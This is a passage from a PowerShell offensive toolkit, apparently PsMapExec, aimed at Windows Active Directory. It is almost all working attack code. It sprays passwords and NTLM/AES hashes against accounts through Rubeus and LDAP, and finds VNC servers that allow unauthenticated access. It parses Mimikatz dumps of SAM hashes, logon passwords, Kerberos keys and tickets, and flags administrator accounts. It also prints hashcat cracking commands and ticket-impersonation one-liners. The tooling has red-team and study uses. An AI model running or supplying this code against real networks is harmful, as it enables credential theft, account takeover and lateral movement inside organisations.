            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
            elseif ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
            
            # Check for Unhandled Rubeus exception
            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }    
            } 
            # Check for KDC_ERR_PREAUTH_FAILED
            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }   
            }
            # Check for TGT request success
            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$Domain\$UserToSpray"
                "$Domain\${UserToSpray}:$Hash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
        }
    }

    # Password Spraying
   if ($Password -ne ""){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # Account as password
    if ($AccountAsPassword){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$UserToSpray)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # EmptyPasswords
    if ($EmptyPassword){
    $password = ""
       
        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            }
        }
    
    }
}

################################################################################################################
################################################## Function: VNC ###############################################
################################################################################################################
Function Method-VNC {

if ($Port -eq ""){$Port = "5900"} else {$Port = $Port}

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($ComputerName, $Port)

      $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }


    if (!$connected) {$tcpClient.Close() ; return}

function VNC-NoAuth {
    param(
        [string]$ComputerName,
        [int]$Port
    )
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
    }
    catch {
        Write-Host "Error: Unable to connect to $ComputerName on port $Port"
        return "Connection Error"
    }

    try {
        $networkStream = $tcpClient.GetStream()
        $networkStream.ReadTimeout = 50
        
        # Reading Version from Server
        $buffer = New-Object byte[] 12
        $read = $networkStream.Read($buffer, 0, 12)
        if ($read -eq 0) { throw "No data received from the server" }
        $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
        # Sending Client Version
        $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
        $networkStream.Write($buffer, 0, $buffer.Length)

        # Reading Supported Security Types
        $buffer = New-Object byte[] 2
        $read = $networkStream.Read($buffer, 0, 1)
        if ($read -eq 0) { throw "No data received from the server" }
        $numberOfSecTypes = $buffer[0]
        $buffer = New-Object byte[] $numberOfSecTypes
        $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
        if ($read -eq 0) { throw "No data received from the server" }
    }
    catch {
        Write-Host "Error: Handshake failed with $ComputerName on port $Port"
        return "Handshake Error"
    }
    finally {
        # Cleanup
        if ($null -ne $networkStream) { $networkStream.Close() }
        if ($null -ne $tcpClient) { $tcpClient.Close() }
    }

    # Check for Non-authentication (Type 1)
    if ($buffer -contains 1) {
        return "Supported"
    }
    else {
        return "Not Supported"
    }
}

$AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
return "$AuthSupported"


}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "VNC " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                if ($result -eq "Not Supported") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Red -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 

                if ($result -eq "Handshake Error") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 
                elseif ($result -eq "Supported") {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
            } 

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################# Function: AdminCount #########################################
################################################################################################################

function AdminCount {
    param (
        [string]$UserName,
        [System.DirectoryServices.DirectorySearcher]$Searcher
    )

    $Searcher.Filter = "(sAMAccountName=$UserName)"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add("adminCount") > $null

    $user = $Searcher.FindOne()

    if ($user -ne $null) {
        $adminCount = $user.Properties["adminCount"]
        if ($adminCount -eq 1) {
            return $true
        }
    }
    return $false
}

################################################################################################################
################################################## Function: Parse-SAM #########################################
################################################################################################################
function Parse-SAM {
    $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
    if (-not $SamFull) {
        New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
    }

    Write-Host
    Write-Host
    Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
    Write-Host

    $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
    $lines = @{}

    foreach ($file in $files) {
        $fileLines = Get-Content $file

        foreach ($line in $fileLines) {
            if ([string]::IsNullOrWhiteSpace($line)) {
                continue
            }

            $lineParts = $line -split ':'
            $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
            $computer = $file.BaseName -split '\.' | Select-Object -First 1
            $computerFormed = "{0}" -f $computer

            if ($lines.ContainsKey($lineWithoutNumber)) {
                $lines[$lineWithoutNumber] += "," + $computerFormed
            } else {
                $lines[$lineWithoutNumber] = $computerFormed
            }
        }
    }

    $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
    if ($duplicateLines) {
        foreach ($duplicate in $duplicateLines) {
            $line = $duplicate.Key
            $computers = $duplicate.Value -split ','
            Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
            Write-Host "$line::"
            Write-Host
        }
    }

    Write-Host
    Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
    Write-Host

    Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '\.' | Select-Object -First 1
        $ComputerFormed = "[{0}]" -f $Computer
        $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
        $content = Get-Content $_.FullName -Verbose
        $output = foreach ($line in $content) {
            $trimmedLine = $line.Trim()
            if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
                $ComputerFormed + $trimmedLine
            }
        }
        $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
    }

    Start-Sleep -Seconds "3"
    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
    Get-Content "$SAM\.Sam-Full.txt"

    Write-Host ""
    Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host ""
    Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
    Write-Host ""
}


################################################################################################################
################################################# Function: Parse-LogonPassword ################################
################################################################################################################
function Parse-LogonPasswords {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds 1

    function Parse-LogonPassword {
        param (
            [string]$raw
        )

        $userInfo = @{}

        function Process-Match {
            param ([string]$match)

            $username = $domain = $NTLM = $password = $null

            foreach ($line in $match.Split("`n")) {
                switch -Regex ($line) {
                    "Username" { $username = $line.Split(":")[1].Trim() }
                    "Domain" { 
                        # Extracting the domain and keeping only the NetBIOS name
                        $domain = $line.Split(":")[1].Trim()
                        $domain = ($domain -split "\.")[0]
                    }
                    "NTLM" { $NTLM = $line.Split(":")[1].Trim() }
                    "Password" { $password = ($line -split ":", 2)[1].Trim() }
                }
            }

            if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                $identity = "$domain\$username"

                if (-not $userInfo.ContainsKey($identity)) {
                    $userInfo[$identity] = @{}
                }

                if ($NTLM) {
                    $userInfo[$identity]["NTLM"] = $NTLM
                }

                if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                    $userInfo[$identity]["Password"] = $password
                }
            }
        }

        $patterns = @(
            "(?s)(?<=msv :).*?(?=tspkg :)",
            "(?s)(?<=tspkg :).*?(?=wdigest :)",
            "(?s)(?<=wdigest :).*?(?=kerberos :)",
            "(?s)(?<=kerberos :).*?(?=ssp :)"
        )

        foreach ($pattern in $patterns) {
            $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                $_.Matches.Value | ForEach-Object {
                    if ($_ -match "Domain") {
                        Process-Match -match $_
                    }
                }
            }
        }

        foreach ($identity in $userInfo.Keys) {
            [PSCustomObject]@{
                Identity = $identity
                NTLM = $userInfo[$identity]["NTLM"]
                Password = $userInfo[$identity]["Password"]
                Notes = ""
            }
        }
    }

    # Directory path where the text files are located.
    $LogonPasswordPath = "$LogonPasswords"

    # Retrieve all text files from the directory.
    $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt

    # Create DirectorySearcher object outside the loop
    $Searcher = New-Searcher -domain "$Domain"

    # Loop through each file in the directory.
    foreach ($File in $Files) {
        # Extract computer name (DNS Hostname) from the file name using regex.
        $Computer = $File.BaseName -replace "-LogonPasswords$", ""

        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        # Retrieve the content of the current file.
        $FileOutput = Get-Content -Raw -Path $File.FullName

        # Parse the Mimikatz output and include ComputerName.
        $ParsedResults = Parse-LogonPassword -raw $FileOutput
        # Update each user's notes if they have an AdminCount of 1
        foreach ($user in $ParsedResults) {
            if ($null -ne $user.Identity) {
                $username = $user.Identity.Split('\')[1]
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $user.Notes = "[AdminCount=1] "
                }
            }
        }

        $ParsedResults |
        Where-Object { $_.NTLM -or $_.Password } |
        ForEach-Object {
            $notesAdditions = @()
            New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$LogonPasswords\$Computer"

            $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity

            if ($userName -in $DomainAdmins) { $notesAdditions += "[Domain Admin] " }
            if ($userName -in $EnterpriseAdmins) { $notesAdditions += "[Enterprise Admin] " }
            if ($userName -in $ServerOperators) { $notesAdditions += "[Server Operator] " }
            if ($userName -in $AccountOperators) { $notesAdditions += "[Account Operator] " }

            # Check if NTLM value indicates an empty password
            if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                $notesAdditions += "[NTLM=Empty Password] "
            }

            if ($($_.Password) -ne $null){
                # Extract username from Identity
                $userName = ($_.Identity -split '\\')[1]  

                # Check if username does not end with $
                if($userName -notmatch '\$$'){
                    $notesAdditions += "[Cleartext Password] "
                }
            }

            $_.Notes += ($notesAdditions -join ' ')

            Write-Host "Username  : $($_.Identity.ToLower())"
            Write-Host "NTLM      : $($_.NTLM)"
            if ($($_.Password) -eq $null) {} Else {Write-Host "Password  : $($_.Password)"}
            if (($_.Notes) -eq ""){} Else {
            Write-Host "Notes     : " -NoNewline

            # Highlight notes in yellow if it contains specific flags
            if ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password" ) {
                Write-Host -ForegroundColor Yellow -NoNewline "$($_.Notes)"
            } else {
                Write-Host -NoNewline "$($_.Notes)"
            }
            Write-Host ""
            Write-Host ""
            "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
            }
            
            Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
        }
    }

    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
    # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
    $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object {$_ -notmatch ":$"}
    $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

    # Print unique NTLM hashes within the banner
    Write-Host
    Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
    Write-Host
    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
    Write-Host
    Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host 
    Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
    Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
}




################################################################################################################
################################################# Function: Parse-eKeys ########################################
################################################################################################################
Function Parse-eKeys {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds "1"
    $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

    # Initialize the DirectorySearcher outside of the loop for better performance
    $domainSearcher = New-Object System.DirectoryServices.DirectorySearcher

    Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
        
        New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
        $ComputerDirectory = "$eKeys\$Computer"
        
        Write-Host
        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        $filePath = $_.FullName
        $fileContent = Get-Content -Path $filePath -Raw
        Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

        $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
        $matches = [regex]::Matches($fileContent, $pattern)

        $uniqueGroups = @{}

        foreach ($match in $matches) {
            $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
            if (([regex]::Matches($password, ' ')).Count -gt 10) {
                $password = "(Hex Value: Redacted)"
            }            
            
            $domainUsername = "$($domain.ToLower())\$username"
            $groupKey = $domainUsername

            if (!$uniqueGroups.ContainsKey($groupKey)) {
                $notes = ""  # This will store the notes

                # Check for non-null passwords and username not ending with $
                if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                    $notes += "[Cleartext Password] "
                }

                $isAdminGroupMember = $DomainAdmins -contains $username -or
                                    $EnterpriseAdmins -contains $username -or
                                    $ServerOperators -contains $username -or
                                    $AccountOperators -contains $username

                # Do not display the adminCount if a user is a member of the specified groups
                if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
                    $notes += "[AdminCount=1] "
                }

                # Check for Empty Password hash
                if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notes += "[rc4_hmac_nt=Empty Password] "
                }

                # Checks for group memberships
                if ($DomainAdmins -contains $username) {
                    $notes += "[Domain Admin] "
                }
                if ($EnterpriseAdmins -contains $username) {
                    $notes += "[Enterprise Admin] "
                }
                if ($ServerOperators -contains $username) {
                    $notes += "[Server Operator] "
                }
                if ($AccountOperators -contains $username) {
                    $notes += "[Account Operator] "
                }

                $group = [PSCustomObject]@{
                    DomainUsername = $domainUsername
                    KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                    Password = $password
                    Notes = $notes
                }

                $uniqueGroups[$groupKey] = $group

                Write-Host "Username    : $domainUsername"
                if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null){} Else {Write-Host "Password    : $password"}

                foreach ($key in $group.KeyList) {
                    if (![string]::IsNullOrWhiteSpace($key)) {
                        $keyParts = $key.Trim() -split '\s+'
                        Write-Host "$($keyParts[0]) : $($keyParts[1])"
                    }
                }
                                if (-not [string]::IsNullOrWhiteSpace($notes)) {
                    Write-Host "Notes       : " -NoNewline
                    Write-Host $notes -ForegroundColor Yellow -NoNewline
                    Write-Host ""
                }

                Write-Host ""
            }
        }
    }

}



################################################################################################################
############################################## Function: Parse-KerbDump ########################################
################################################################################################################

function Parse-KerbDump {
    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
    Start-sleep -Seconds "2"

    # Initialize DirectorySearcher
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

    # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
    Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$KerbDump\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName     = $match.Groups[1].Value
                    EncryptionType  = $match.Groups[2].Value
                    TicketExp       = $match.Groups[3].Value
                    ServerName      = $match.Groups[4].Value
                    UserName        = $match.Groups[5].Value
                    Flags           = $match.Groups[6].Value
                    SessionKeyType  = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }

                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else {Write-Host "Server Name   : $($data.ServerName.ToLower())"}
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT"){
                        do {
                            $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                        } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                        Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                        # A neat one-liner instruction for the user
                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName"
                        Write-Host
                        
                        } Else {Write-Host}
                    }
                }
            }

             # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

    Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Run with -NoParse to prevent parsing results in the future"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Each ticket has been stored in $KerbDump"
}


################################################################################################################
################################################# Function: RestoreTicket ######################################
################################################################################################################
Function RestoreTicket{
if (!$CurrentUser) {
    if ($Method -ne "GenRelayList"){
    klist purge | Out-Null
    Start-sleep -Milliseconds 100
    klist purge | Out-Null
    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
        
        }
    }
}

################################################################################################################
################################################ Execute defined functions #####################################
################################################################################################################

switch ($Method) {
        "WinRM" {Method-WinRM}
        "MSSQL" {Method-MSSQL}
        "SMB" {Method-SMB}
        "WMI" {Method-WMIexec}
        "RDP" {Method-RDP}
        "GenRelayList" {GenRelayList}
        "SessionHunter" {Invoke-SessionHunter}
        "Spray" {Spray}
        "VNC" {Method-VNC}
        
        default {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Invalid Method specified"
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specify either WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
        return
      
      }
 }

if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}

RestoreTicket

Write-Host ""
$Time = (Get-Date).ToString("HH:mm:ss")
Write-Host "Script Completed : $Time"
$elapsedTime = (Get-Date) - $startTime

# Format the elapsed time
$elapsedHours = "{0:D2}" -f $elapsedTime.Hours
$elapsedMinutes = "{0:D2}" -f $elapsedTime.Minutes
$elapsedSeconds = "{0:D2}" -f $elapsedTime.Seconds
$elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds

# Display the formatted elapsed time
$elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
Write-Host "Elapsed Time     : $elapsedTime"
Get-Variable | Remove-Variable -ErrorAction SilentlyContinue

}
